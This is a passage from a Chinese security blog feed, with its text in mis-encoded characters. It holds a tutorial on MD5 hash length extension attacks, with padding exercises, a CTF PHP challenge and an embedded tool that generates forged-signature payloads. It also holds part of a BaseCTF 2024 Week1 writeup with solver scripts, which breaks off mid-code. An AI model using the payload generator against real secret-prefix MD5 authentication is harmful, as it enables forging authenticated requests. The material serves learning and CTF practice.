class="hljs-string">&#x27;user&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, -<span class="hljs-number">5</span>) !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¸æ˜¯ç®¡ç†å‘˜ä¹Ÿæ¥å‡‘çƒ­é—¹?&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$md5</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$random</span> . <span class="hljs-variable">$name</span>) !== <span class="hljs-variable">$md5</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ä¼ªé€ ? NO NO NO!&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºäº†ä¸€ä¸ª96å­—èŠ‚çš„æ˜æ–‡ï¼Œä½†æ˜¯å†…å®¹æœªçŸ¥ã€‚ç„¶åç»™å‡ºè¿™ä¸ªæ˜æ–‡çš„ MD5å€¼ã€‚ç„¶åè¦æ±‚ä½ é™„åŠ ä¸€æ®µæ–‡å­—ï¼Œæ–‡å­—ä»¥ <code>admin</code>ç»“å°¾ï¼Œä½¿å¾—æ˜æ–‡åŠ ä¸Šé™„åŠ æ–‡å­—çš„ MD5 èƒ½è¢«æ±‚å‡ºæ¥ã€‚è¿™é‡Œå°±è®¾è®¡åˆ°äº†æœ¬æ–‡ä»‹ç»çš„Hash é•¿åº¦æ‰©å±•æ”»å‡»ã€‚</p><p>æœ¬æ–‡åœ¨ä»‹ç»éƒ¨åˆ†å°±ä»¥ MD5 æ¥ä»‹ç» Hash é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œå®é™…ä¸ŠSHA1ï¼ŒSHA2çš„ç®—æ³•ä¹Ÿéƒ½å—è¯¥æ”»å‡»çš„å½±å“ï¼Œåªæ˜¯å½±å“çš„æ–¹å¼éƒ½å¤§åŒå°å¼‚ï¼Œç›¸ä¿¡èªæ˜çš„ä½ ä¸¾ä¸€åä¸‰å°±ä¸€å®šä¼šäº†ã€‚</p><h2 id="md5-ç®—æ³•">MD5 ç®—æ³•</h2><p>è¯¥æ”»å‡»è¿‡ç¨‹æ˜¯æ‚å‡‘å‡½æ•°å¡«å……è¿‡ç¨‹ä¸­ç”±äºè‡ªèº«çš„é€»è¾‘å¯¼è‡´çš„ï¼Œæ‰€ä»¥åœ¨ä»¥ MD5ä¸ºä¾‹å­ä»‹ç» Hash é•¿åº¦æ‰©å±•æ”»å‡»å‰ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ MD5ç®—æ³•çš„å…·ä½“å®ç°è¿‡ç¨‹ã€‚</p><figure><img src="./MD5.svg" alt="MD5 å®ç°" /><figcaption aria-hidden="true">MD5 å®ç°</figcaption></figure><p>ä¸Šå›¾å±•ç¤ºäº† MD5 ç®—æ³•çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬ä»ä¸Šè‡³ä¸‹ã€ä»å·¦è‡³å³åœ°çœ‹è¿™å¼ å›¾ã€‚</p><h3 id="å¡«å……">å¡«å……</h3><p>MD5çš„ç¬¬ä¸€æ­¥å°±æ˜¯å¯¹æ˜æ–‡è¿›è¡Œå¡«å……ï¼Œä½¿å¾—å…¶é•¿åº¦ä¸º512æ¯”ç‰¹çš„å€æ•°ï¼Œä»è€Œå¯ä»¥åˆ‡åˆ†æˆé•¿ä¸º64å­—èŠ‚ï¼ˆç­‰äº512æ¯”ç‰¹ï¼Œä¸‹é¢éƒ½ç”¨å­—èŠ‚æ¥è¡¨ç¤ºäº†ï¼‰çš„åˆ†ç»„ã€‚é‚£ä¹ˆå¡«å……ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æŒ‰ç…§ <a href="https://www.ietf.org/rfc/rfc1321.txt">RFC1321</a>çš„æ ‡å‡†</p><ol type="1"><li>åœ¨æ˜æ–‡æœ«å°¾å¡«å…… <code>0x80</code> ï¼ˆ1å­—èŠ‚ï¼‰</li><li>åœ¨æœ€åä¸€ä¸ªåˆ†ç»„çš„æœ€å8å­—èŠ‚å¡«å……æ˜æ–‡çš„é•¿åº¦ï¼Œ<strong>æ³¨æ„ï¼ï¼ï¼è¿™é‡Œç”¨çš„æ¯”ç‰¹é•¿åº¦ï¼Œæ‰€ä»¥å­—èŠ‚è¦ä¹˜ä»¥8</strong>ï¼ˆ8å­—èŠ‚ï¼‰</li><li>å…¶ä½™éƒ¨åˆ†å¡«å…… <code>0x00</code></li></ol><p>æ¥ç‚¹å°ç»ƒä¹ ï¼š</p><blockquote><p>Q1ï¼šå‡å¦‚æœ€åä¸€ä¸ªåˆ†ç»„é•¿åº¦ä¸º32å­—èŠ‚ï¼Œå¡«å……å¤šå°‘ <code>0x00</code>ï¼ˆä»…é™<code>0x00</code> å¡«å……éƒ¨åˆ†ï¼Œä¸‹åŒï¼‰ï¼Ÿ</p><p>A1ï¼š64-32-1-8 = 23å­—èŠ‚</p></blockquote><blockquote><p>Q2ï¼šå‡å¦‚æœ€åä¸€ä¸ªåˆ†ç»„é•¿åº¦ä¸º56å­—èŠ‚ï¼Œå¡«å……å¤šå°‘ <code>0x00</code>ï¼Ÿ</p><p>A2ï¼š64-56-1-8 = -1å­—èŠ‚ï¼Ÿå¦‚æœå¡«äº† <code>0x80</code>åå¡«ä¸ä¸‹é•¿åº¦ï¼Œé‚£ä¹ˆå°±æ–°å¼€ä¸€ä¸ªåˆ†æ®µå¡«å……é•¿åº¦ï¼Œæ‰€ä»¥æ˜¯ 63 å­—èŠ‚ã€‚</p></blockquote><blockquote><p>Q3ï¼šå‡å¦‚æœ€åä¸€ä¸ªåˆ†ç»„é•¿åº¦ä¸º55å­—èŠ‚ï¼Œå¡«å……å¤šå°‘ <code>0x00</code>ï¼Ÿ</p><p>A3ï¼š64-55-1-8 = 0å­—èŠ‚ï¼Œåˆšåˆšå¥½ï¼</p></blockquote><h3 id="åˆ†ç»„è®¡ç®—">åˆ†ç»„è®¡ç®—</h3><p>è¿™é‡Œæˆ‘ä¸æƒ³èµ˜è¿° MD5 ä¸­å¯¹æ¯ä¸ªåˆ†ç»„ä¸­è®¡ç®—çš„å…·ä½“è¿‡ç¨‹ï¼Œå¦‚æœå¥½å¥‡å¯ä»¥çœ‹ <ahref="https://www.ietf.org/rfc/rfc1321.txt">RFC1321</a>æ ‡å‡†ï¼Œæˆ–è€…å…¶ä»–åšå®¢ã€‚æˆ‘ä»¬åªéœ€è¦å°†è¿™æ®µè¿‡ç¨‹è®°ä¸º <spanclass="math inline">\(\textbf{H}_C(\textbf{B_i},\textbf{V})\)</span>ï¼Œå…¶ä¸­ <span class="math inline">\(\textbf{B_i}\)</span>æ˜¯æ˜æ–‡çš„å½“å‰åˆ†ç»„ï¼Œ<span class="math inline">\(\textbf{V}\)</span>æ˜¯ä¸€ä¸ªå‘é‡ï¼Œæœ‰ä¸€ä¸ªåˆå§‹å€¼ã€‚å¯¹æ‰€æœ‰çš„åˆ†ç»„è®¡ç®—å®Œæˆåï¼Œ<spanclass="math inline">\(\textbf{V}\)</span> å°±æ˜¯è¯¥æ®µæ˜æ–‡çš„ MD5æ‚å‡‘å€¼ã€‚é‚£ä¹ˆ MD5 è®¡ç®—æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">MD5</span>:<br>    V = IV<br>    <span class="hljs-keyword">for</span> B_i <span class="hljs-keyword">in</span> B:<br>        _V = H_C(B_i, V)<br>        V += _V<br>    <span class="hljs-keyword">return</span> V<br></code></pre></td></tr></table></figure><h2 id="md5-é•¿åº¦æ‰©å±•æ”»å‡»">MD5 é•¿åº¦æ‰©å±•æ”»å‡»</h2><p>ä¸‹é¢ä»‹ç»æ”»å‡»è¿‡ç¨‹ï¼Œå…ˆçœ‹ä¸‹å›¾ï¼š</p><figure><img src="./LEA.svg" alt="é•¿åº¦æ‰©å±•æ”»å‡»" /><figcaption aria-hidden="true">é•¿åº¦æ‰©å±•æ”»å‡»</figcaption></figure><p>åè¯é‡çˆ†ç‚¸ï¼Œä¸æ˜¯å—ï¼Ÿæ‹ä¸€ä¸‹ç›¸å…³çš„åè¯ï¼š</p><ul><li>åŸå¡«å……ï¼šæ˜æ–‡åœ¨è®¡ç®— MD5 è¿‡ç¨‹ä¸­çš„å¡«å……</li><li>æ‰©å±•æ¶ˆæ¯ï¼šä½ å¸Œæœ›æ·»åŠ çš„æ¶ˆæ¯ï¼Œä½†æ˜¯<strong>è¯·æ³¨æ„</strong>ï¼Œè¿™é‡Œçš„æ‰©å±•æ¶ˆæ¯å¹¶ä¸æ˜¯ç›´æ¥æ·»åŠ åœ¨æ˜æ–‡åé¢çš„</li><li>ä¼ªé€ æ¶ˆæ¯ï¼šç­‰äºåŸå¡«å……+æ‰©å±•æ¶ˆæ¯ï¼Œè¿™æ‰æ˜¯ç›´æ¥æ·»åŠ åœ¨æ˜æ–‡åé¢çš„å†…å®¹</li><li>æ‰©å±•å¡«å……ï¼šå°†æ˜æ–‡+ä¼ªé€ æ¶ˆæ¯å˜ä¸ºä¸€ä¸ªæ–°çš„æ˜æ–‡ï¼Œä¸ºè®¡ç®—æ–°æ˜æ–‡çš„ MD5è€Œæ·»åŠ çš„å¡«å……</li></ul><p>å¯ä»¥çœ‹åˆ°ï¼Œæ‰©å±•å¡«å……é‡Œé¢çš„é•¿åº¦ä¸º<code>æ˜æ–‡+(åŸå¡«å……+æ‰©å±•æ¶ˆæ¯) = æ˜æ–‡+ä¼ªé€ æ¶ˆæ¯</code> çš„æ€»é•¿åº¦ã€‚</p><p>è€è§„å¾‹ï¼Œè¿˜æ˜¯æ¥ç‚¹ä¾‹é¢˜ï¼ˆä½ ä¸ç»™ä¾‹é¢˜æˆ‘çŸ¥é“é¢˜æ€ä¹ˆåšå•Šï¼‰</p><blockquote><p>Q1ï¼šæ˜æ–‡é•¿ä¸º96å­—èŠ‚ï¼Œæ‰©å±•æ¶ˆæ¯é•¿ä¸º5å­—èŠ‚ï¼Œè¯·é—®æ‰©å±•å¡«å……ä¸­æœ‰å¤šå°‘<code>0x00</code>ï¼Œé•¿åº¦ä¸ºå¤šå°‘ï¼Ÿ</p><p>A1ï¼šé¦–å…ˆè®¡ç®—åŸå¡«å……ï¼Œä¸€çœ‹1+23+8=32å­—èŠ‚ï¼Œæ€»æ¶ˆæ¯é•¿ä¸º96+32+5=133å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªåˆ†ç»„5å­—èŠ‚ï¼Œå¡«å……50ä¸ª<code>0x00</code>ï¼Œé•¿åº¦ä¸º133*8=1064</p></blockquote><blockquote><p>Q2ï¼šæ˜æ–‡é•¿ä¸º55å­—èŠ‚ï¼Œæ‰©å±•æ¶ˆæ¯é•¿ä¸º120å­—èŠ‚ï¼Œè¯·é—®æ‰©å±•å¡«å……ä¸­æœ‰å¤šå°‘<code>0x00</code>ï¼Œé•¿åº¦ä¸ºå¤šå°‘ï¼Ÿ</p><p>A2ï¼šé¦–å…ˆè®¡ç®—åŸå¡«å……ï¼Œä¸€çœ‹1+0+8=9å­—èŠ‚ï¼Œæ€»æ¶ˆæ¯é•¿ä¸º55+9+120=184å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªåˆ†ç»„56å­—èŠ‚ï¼Œå¡«å……63ä¸ª<code>0x00</code>ï¼Œé•¿åº¦ä¸º184*8=1472</p></blockquote><blockquote><p>Q3ï¼šæ˜æ–‡é•¿ä¸º56å­—èŠ‚ï¼Œæ‰©å±•æ¶ˆæ¯é•¿ä¸º0å­—èŠ‚ï¼Œè¯·é—®æ‰©å±•å¡«å……ä¸­æœ‰å¤šå°‘<code>0x00</code>ï¼Œé•¿åº¦ä¸ºå¤šå°‘ï¼Ÿ</p><p>A3ï¼šé¦–å…ˆè®¡ç®—åŸå¡«å……ï¼Œä¸€çœ‹1+63+8=72å­—èŠ‚ï¼Œæ€»æ¶ˆæ¯é•¿åº¦ä¸º56+72+0=128å­—èŠ‚ï¼Œæœ€åä¸€ä¸ªåˆ†ç»„ä¸º64å­—èŠ‚ï¼Œå¡«å……55ä¸ª<code>0x00</code>ï¼Œé•¿åº¦ä¸º128*8=1024</p></blockquote><h3 id="è®¡ç®—ç»“æœ">è®¡ç®—ç»“æœ</h3><p>ç›¸ä¿¡æ˜ç™½å›¾1å’Œå›¾2åï¼Œèªæ˜çš„ä½ å·²ç»çŸ¥é“è¯¥æ€ä¹ˆè®¡ç®—æ·»åŠ æ‰©å±•æ¶ˆæ¯åçš„ MD5å€¼äº†å§ã€‚å¦‚ä¸‹å›¾ï¼š</p><figure><img src="./LEA_Algo.svg" alt="é•¿åº¦æ‰©å±•æ”»å‡»è¿‡ç¨‹" /><figcaption aria-hidden="true">é•¿åº¦æ‰©å±•æ”»å‡»è¿‡ç¨‹</figcaption></figure><p>æˆ‘ä»¬å°†æ˜æ–‡ MD5 å€¼ä½œä¸ºå‘é‡çš„åˆå§‹å€¼ <spanclass="math inline">\(\textbf{V}\)</span>ï¼Œç„¶åæŠŠ<code>ä¼ªé€ æ¶ˆæ¯+æ‰©å±•å¡«å……</code> æ¯64å­—èŠ‚åˆ†æˆä¸€ç»„ <spanclass="math inline">\(\textbf{B_i}\)</span>ï¼Œé€åˆ° <spanclass="math inline">\(\textbf{H}_C(\textbf{B_i},\textbf{V})\)</span>ä¸­ï¼Œå°±å¾—åˆ°äº†æ‰©å±•åçš„ MD5 å€¼ã€‚</p><h2 id="å°å·¥å…·">å°å·¥å…·</h2><p>è¿™é‡Œæˆ‘å†™äº†ä¸€ä¸ªå°å·¥å…·æ¥ç”Ÿæˆä½ éœ€è¦çš„æ”»å‡»è´Ÿè½½ä»¥åŠå¯¹åº”çš„æ‚å‡‘å€¼ã€‚ï¼ˆä½†æ„¿å®ƒæ²¡æœ‰é—®é¢˜ï¼‰</p><div id="app">  <ul class="nav nav-tabs" id="hash-algo" role="tablist">    <li class="nav-item m-0" role="presentation">      <button class="nav-link active" id="md5-tab" data-toggle="tab" data-target="#md5" type="button" role="tab" aria-controls="home" aria-selected="true">MD5</button>    </li>    <li class="nav-item m-0" role="presentation">      <button class="nav-link" id="sha1-tab" data-toggle="tab" data-target="#sha1" type="button" role="tab" aria-controls="profile" aria-selected="false">SHA1</button>    </li>  </ul>  <div class="tab-content mt-2" id="myTabContent">    <div class="tab-pane fade show active" id="md5" role="tabpanel" aria-labelledby="home-tab">      <div class="form-group mb-3">        <label class="mb-2" for="msg-md5">åŸæ–‡MD5</label>        <input type="text" class="form-control" :class="{ 'is-invalid': !isValidMd5 }" v-model="msgMd5" id="msg-md5">        <div v-if="!isValidMd5" class="invalid-feedback">è¯·è¾“å…¥æ­£ç¡®çš„åå…­è¿›åˆ¶çš„ MD5 å€¼</div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="msg-length">åŸæ–‡é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰</label>        <input type="number" class="form-control" v-model="msgLength" id="msg-length">      </div>      <div class="form-group mb-3">        <label class="mb-2" for="extension">é™„åŠ ä¿¡æ¯</label>        <div class="input-group" id="extension">          <input type="text" class="form-control" v-model="extension">          <select class="custom-select col-3" v-model="extensionEncode">            <option disabled value="">ç¼–ç æ–¹å¼</option>            <option value="utf8">UTF-8</option>            <option value="hex">Hex</option>          </select>        </div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="lea-payload-output">æ‰©å±•æ”»å‡»è´Ÿè½½</label>        <div class="input-group" id="lea-payload-output">          <input type="text" readonly class="form-control" v-model="leaPayload">          <select class="custom-select col-3" v-model="leaPayloadEncode">            <option disabled value="">ç¼–ç æ–¹å¼</option>            <option value="hex">Hex</option>            <option value="b64">Base64</option>            <option value="url">UrlEncode</option>          </select>        </div>      </div>      <div class="form-group mb-3">        <label class="mb-2" for="lea-md5-output">æ”»å‡»ç»“æœ</label>        <input type="text" readonly class="form-control" v-model="leaMd5" id="lea-md5-output">      </div>    </div>    <div class="tab-pane fade" id="sha1" role="tabpanel" aria-labelledby="profile-tab">ä»¥åå†è¯´å§</div>  </div></div><script type="module">  import { MD5, toHex, fromHex, Base64 } from './length-extension-attack.js'  import { createApp } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js'  const encoder = new TextEncoder();  const decoder = new TextDecoder("utf-8");  createApp({    data() {      return {        msgMd5: "",        msgLength: 0,        extension: "",        extensionEncode: "",        leaPayloadEncode: "",      }    },    computed: {      isValidMd5() {        return /^[0-9a-fA-F]{32}$/gm.test(this.msgMd5);      },      encExtension() {        switch (this.extensionEncode) {          case "utf8":            return encoder.encode(this.extension);          case "hex":            return fromHex(this.extension);          default:            return new Uint8Array(0);        }      },      leaPayload() {        if (this.isValidMd5) {          let payload = MD5.lengthExtensionAttackPayloadGen(            this.msgLength,            this.encExtension          );          switch (this.leaPayloadEncode) {            case "b64":              return Base64.b64encode(payload);            case "url":              return Array.from(payload).map(                byte => encodeURI(String.fromCharCode(byte))              ).join("");            default:              return toHex(payload);          }        } else {          return "";        }      },      leaMd5() {        if (this.isValidMd5) {          return MD5.lengthExtensionAttackHexDigest(            this.msgMd5,            this.msgLength,            this.encExtension          );        } else {          return "";        }      }    }  }).mount("#app");</script>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
      <category>ç«èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BaseCTF 2024 Week1 Writeup</title>
    <link href="/2024/08/21/ctf/basectf2024/week1/"/>
    <url>/2024/08/21/ctf/basectf2024/week1/</url>
    
    <content type="html"><![CDATA[<p>BaseCTF 2024 ç¬¬ä¸€å‘¨èµ›é¢˜çš„ WPï¼Œçƒ­èº«èµ›æã€‚</p><span id="more"></span><p>åœ¨å°ç¾½ç½‘å®‰çš„å…¬ä¼—å·çœ‹åˆ°çš„ï¼Œæœ¬æ¥æ¯•è®¾å·²ç»å¾ˆç„¦è™‘äº†ï¼Œä½†æ˜¯å°±æ˜¯ä¸»æ‰“ä¸€ä¸ªä¸»æ¬¡ä¸åˆ†ã€‚</p><h2 id="misc">Misc</h2><h3 id="æ ¹æœ¬è¿›ä¸å»å•Š">æ ¹æœ¬è¿›ä¸å»å•Š!</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dig -t TXT flag.basectf.fun<br></code></pre></td></tr></table></figure><h3 id="æµ·ä¸Šé‡åˆ°äº†é²¨é±¼">æµ·ä¸Šé‡åˆ°äº†é²¨é±¼</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_wireshark.png" class="" title="Wireshark åˆ†æåŒ…"><p>å¤åˆ¶æ–‡æœ¬ç„¶åæ‰§è¡Œä»¥ä¸‹ Python è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;flag&gt;&quot;</span>[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹å‘¢">æ­£ç€çœ‹è¿˜æ˜¯åç€çœ‹å‘¢ï¼Ÿ</h3><img src="/2024/08/21/ctf/basectf2024/week1/misc_flagorgalf.png" class="" title="hex åˆ†æ"><p>çœ‹åˆ°æœ€åæ˜¯ä¸€ä¸ª JFIF çš„å€’ç€å†™ï¼Œæ‰§è¡Œä¸‹é¢çš„ Python è„šæœ¬å°†æ–‡ä»¶å€’è¿‡æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f, <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;galf.jpg&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> d:<br>    data = f.read()<br>    d.write(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(data))))<br></code></pre></td></tr></table></figure><p><code>binwalk</code> æŸ¥ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç° <code>flag.txt</code>å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä»¥ä¸ºæ˜¯ä¸ªå‡çš„ï¼Œå‹ç¼©åŒ…è§£å‹å‡ºæ¥ä¹Ÿæ˜¯ï¼Œé‚£å°±äº¤äº†å§ã€‚</p><h3 id="base">Base</h3><p>åé¢6ä¸ªç­‰äºå·ï¼Œå¤§æ¦‚æ˜¯ Base ç¼–ç ç³»åˆ—ä½†æ˜¯ä¸æ˜¯Base64ã€‚åˆ†æä¸€ä¸‹ç¼–ç ç»“æœï¼Œå‘ç°åªæœ‰å¤§å†™å­—æ¯å’Œä¸€äº›æ•°å­—ï¼Œé‚£ä¹ˆå¤§æ¦‚ç‡æ˜¯Base32 äº†ï¼Œè§£ä¸€ä¸‹å‘ç°å¥½åƒæ˜¯ Base64ï¼Œå†è§£ä¸€ä¸‹å°±<ahref="https://gchq.github.io/CyberChef/#recipe=From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true,false)&amp;input=S0ZXVU02UzJLVkhGS1VUT09RWlZVVkNHTkpHVU9NTE1MQVpWRTVTWUdKRVRBWVpTS1pWR0lSMjJIRT09PT09PQ">flag</a>äº†ã€‚</p><h3 id="äººç”Ÿè‹¦çŸ­æˆ‘ç”¨python">äººç”Ÿè‹¦çŸ­ï¼Œæˆ‘ç”¨Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> accumulate, product<br><br>n = <span class="hljs-number">38</span><br>ind = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(n))<br>flag = [<span class="hljs-string">&#x27; &#x27;</span>]*n<br><br><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-string">&quot;BaseCTF&#123;&quot;</span>):<br>    flag[i] = c<br><br>flag[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;Mp&quot;</span>)<br><br>flag[-<span class="hljs-number">3</span>:] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;3x&#125;&quot;</span>)<br><br>flag[-<span class="hljs-number">1</span>] = <span class="hljs-built_in">chr</span>(<span class="hljs-number">125</span>)<br><br><span class="hljs-keyword">for</span> i, ind <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(accumulate([<span class="hljs-number">14</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>][:-<span class="hljs-number">1</span>])):<br>    flag[i+ind] = <span class="hljs-string">&#x27;_&#x27;</span><br><span class="hljs-comment"># assert list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))) == [14, 2, 6, 4, 8], str(list(map(len, &quot;&quot;.join(flag).split(&#x27;_&#x27;))))</span><br><br>flag[<span class="hljs-number">12</span>:<span class="hljs-number">32</span>:<span class="hljs-number">4</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;lsT_n&quot;</span>)<br><br><span class="hljs-comment"># flag[8] = &#x27;S&#x27;</span><br>flag[<span class="hljs-number">8</span>] = <span class="hljs-string">&#x27;s&#x27;</span><br><br>flag[-<span class="hljs-number">11</span>] = <span class="hljs-string">&#x27;4&#x27;</span><br><br>flag[-<span class="hljs-number">7</span>:-<span class="hljs-number">3</span>] = <span class="hljs-built_in">list</span>(base64.b64decode(<span class="hljs-string">&#x27;MG1QbA==&#x27;</span>).decode())<br><br>flag[::-<span class="hljs-number">7</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;7d4372733173&quot;</span>).decode())<br><br><span class="hljs-comment"># set(flag[12::11]) == &#123;&#x27;l&#x27;, &#x27;r&#x27;&#125;</span><br><br>flag[<span class="hljs-number">21</span>:<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">116</span>, <span class="hljs-number">51</span>, <span class="hljs-number">114</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">104</span>]).decode())<br><br><span class="hljs-keyword">for</span> _c <span class="hljs-keyword">in</span> product(string.printable, repeat=<span class="hljs-number">2</span>):<br>    _s = [flag[<span class="hljs-number">17</span>], *_c]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(_s)) == <span class="hljs-number">41378751114180610</span>:<br>        flag[<span class="hljs-number">17</span>:<span class="hljs-number">20</span>] = _s<br>        <span class="hljs-keyword">break</span><br><br>flag[<span class="hljs-number">13</span>] = <span class="hljs-string">&#x27;3&#x27;</span><br>flag[<span class="hljs-number">15</span>] = <span class="hljs-string">&#x27;1&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h2 id="crypto">Crypto</h2><h3 id="ez_math">ez_math</h3><p>çœ‹æ¥ä¸æ˜¯æ ‡å‡†è§£ï¼Œä¸¤ä¸ªä¸‰è§’çŸ©é˜µ6ä¸ªæœªçŸ¥é‡åŠ ä¸Š <spanclass="math inline">\(a, b, c, d\)</span> ä¸ <code>flag</code>5ä¸ªå…±11ä¸ªæœªçŸ¥é‡ï¼ŒçŸ©é˜µæ˜¯9ä¸ªç­‰å¼ï¼Œ2ä¸ªä¹˜ç§¯2ä¸ªç­‰å¼ï¼Œå¯ä»¥è§£å‡º<code>flag</code>ã€‚ç”¨ sagemath è§£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs sagemath">R = matrix([[<br>    73595299897883318809385485549070133693240974831930302408429664709375267345973630251242462442287906226820558620868020093702204534513147710406187365838820773200509683489479230005270823245,<br>    46106113894293637419638880781044700751458754728940339402825975283562443072980134956975133603010158365617690455079648357103963721564427583836974868790823082218575195867647267322046726830,<br>    161159443444728507357705839523372181165265338895748546250868368998015829266587881868060439602487400399254839839711192069105943123376622497847079185,<br>], [<br>    13874395612510317401724273626815493897470313869776776437748145979913315379889260408106588331541371806148807844847909,<br>    17025249852164087827929313934411832021160463738288565876371918871371314930048841650464137478757581505369909723030523,<br>    59510107422473463833740668736202898422777415868238817665123293560097821015330,<br>], [<br>    11314088133820151155755028207579196628679021106024798818326096960197933616112389017957501267749946871903275867785729,<br>    13883500421020573457778249958402264688539607625195400103961001780695107955462968883861677871644577542226749179056659,<br>    48528427402189936709203219516777784993195743269405968907408051071264464132448,<br>]])<br><br>f, x1, y1, z1, x2, y2, z2 = var(&quot;f, x1, y1, z1, x2, y2, z2&quot;)<br><br>u = matrix([[1,x1,y1], [0,1,z1], [0,0,1]])<br>l = 